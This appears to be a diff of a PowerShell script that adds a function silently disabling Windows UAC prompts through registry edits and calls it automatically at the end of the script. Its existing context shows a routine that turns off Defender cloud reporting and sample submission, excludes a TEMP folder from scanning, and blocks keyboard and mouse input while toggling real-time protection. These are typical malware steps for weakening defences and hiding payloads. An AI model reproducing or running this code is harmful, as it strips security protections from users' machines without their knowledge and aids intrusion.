@@ -37,21 +37,25 @@ function set-window {
 	$show | % { $null = [Window]::ShowWindow($hwnd, $_) }
 }
 
-function DefenderRealTimeProtection {
-	[Alias('drtp')]
+function disable-uac {
+	Start-Process -Verb RunAs -Wait reg 'add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f'
+	Start-Process -Verb RunAs -Wait reg 'add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f'
+	Start-Process -Verb RunAs -Wait reg 'add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f'
+	Start-Process -Verb RunAs -Wait reg 'add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f'
+}
+
+function defender-realtime-protection {
+	[Alias('drp')]
 	param(
 		[bool]$status = $true
 	)
-
 $code = @"
 [DllImport("user32.dll")]
 public static extern bool BlockInput(bool fBlockIt);
 "@
-
 	Set-MpPreference -MAPSReporting Disable
 	Set-MpPreference -SubmitSamplesConsent NeverSend
 	Add-MpPreference -ExclusionPath "$Env:TEMP\ssokka" -Force
-
 	if ((Get-MpComputerStatus).RealTimeProtectionEnabled -ne $status) {
 		$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
 		while($true) {
@@ -137,3 +141,4 @@ function install-7zip {
 }
 
 set-window
+disable-uac
